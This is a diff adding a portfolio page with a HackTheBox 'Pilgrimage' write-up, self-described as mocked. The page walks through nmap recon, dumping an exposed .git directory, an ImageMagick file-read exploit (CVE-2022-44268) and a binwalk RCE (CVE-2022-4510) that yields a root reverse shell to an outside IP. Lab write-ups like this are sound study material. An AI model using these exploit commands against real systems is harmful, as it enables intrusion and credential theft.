@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>andrxhh — Pilgrimage writeup</title>
+<link rel="stylesheet" href="styles.css" />
+</head>
+<body data-screen-label="03d Writeup detail">
+
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="index.html"><span class="prompt">$</span> andrxhh<span class="cursor"></span></a>
+    <nav class="nav">
+      <a href="index.html">home</a>
+      <a href="about.html">about</a>
+      <a class="active" href="writeups.html">writeups</a>
+      <a href="certs.html">certs</a>
+      <a href="projects.html">projects</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap prose">
+  <a href="writeups-htb.html" class="back-link">← htb writeups</a>
+  <p class="prompt-line"><span class="p">$</span> cat pilgrimage.md</p>
+  <h1>Pilgrimage</h1>
+  <div class="meta-bar">
+    <span>HackTheBox</span>
+    <span>linux</span>
+    <span>easy</span>
+    <span>2026-04-22</span>
+  </div>
+
+  <p class="dim">
+    Pilgrimage is a Linux box that hosts a public image-shrinking service.
+    The intended path goes through a CVE in <code>magick</code> for the user
+    flag, then a setuid binwalk for root.
+  </p>
+
+  <h2>recon</h2>
+  <p>Standard <code>nmap</code> sweep first — open ports + service versions.</p>
+  <pre><span class="p">$</span> nmap -sC -sV -oA nmap/initial 10.10.11.219
+<span class="c"># 22/tcp  open  ssh   OpenSSH 8.4p1</span>
+<span class="c"># 80/tcp  open  http  nginx 1.18.0  pilgrimage.htb</span></pre>
+
+  <p>Adding the host to <code>/etc/hosts</code> and visiting the page shows
+  a simple image-shrinker. The footer leaks a <code>.git</code> directory.</p>
+
+  <pre><span class="p">$</span> git-dumper http://pilgrimage.htb/.git/ loot/
+<span class="p">$</span> cd loot &amp;&amp; git log --oneline</pre>
+
+  <h2>foothold</h2>
+  <p>The repo ships a vendored <code>magick</code> binary. Checking the
+  version against known CVEs lines it up with <strong>CVE-2022-44268</strong>,
+  an arbitrary file-read via crafted PNG metadata.</p>
+
+  <blockquote>
+    Any user-supplied PNG that gets resized will silently embed the contents
+    of a server-side file inside the output PNG's metadata.
+  </blockquote>
+
+  <pre><span class="p">$</span> python3 exploit.py /etc/passwd
+<span class="p">$</span> curl -F "<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="add9c2fec5dfc4c3c690edddccd4c1c2ccc983ddc3ca">[email&#160;protected]</a>" http://pilgrimage.htb/upload.php</pre>
+
+  <p>Reading the returned image's metadata gives us
+  <code>/var/db/pilgrimage</code> — a SQLite DB containing the
+  <code>emily</code> user's password hash, reusable over SSH.</p>
+
+  <h2>privilege escalation</h2>
+  <p><code>pspy</code> shows a root cronjob running <code>binwalk</code> on
+  every uploaded image. <strong>binwalk 2.3.2</strong> is vulnerable to
+  <strong>CVE-2022-4510</strong> — RCE via a malicious PFS archive embedded
+  in any file it scans.</p>
+
+  <pre><span class="p">$</span> python3 binwalk_exploit.py -p 9001 -i 10.10.14.5 shell.png
+<span class="p">$</span> cp shell.png /var/www/pilgrimage.htb/shrunk/
+<span class="c"># ~60s later: reverse shell as root</span></pre>
+
+  <h2>takeaways</h2>
+  <ul>
+    <li>always check vendored binaries against CVE lists, not just versions.</li>
+    <li><code>pspy</code> remains the fastest way to spot timed cron paths.</li>
+    <li>image-metadata bugs are still a soft underbelly in upload pipelines.</li>
+  </ul>
+
+  <hr />
+  <p class="dim" style="font-size:13px;">
+    <em>note:</em> this is a mocked writeup — real content lives in the markdown source.
+  </p>
+
+  <div class="footer">
+    <a href="writeups-htb.html" style="color:var(--fg-muted);">← more htb writeups</a>
+    <span>// happy hacking</span>
+  </div>
+</main>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
+</html>
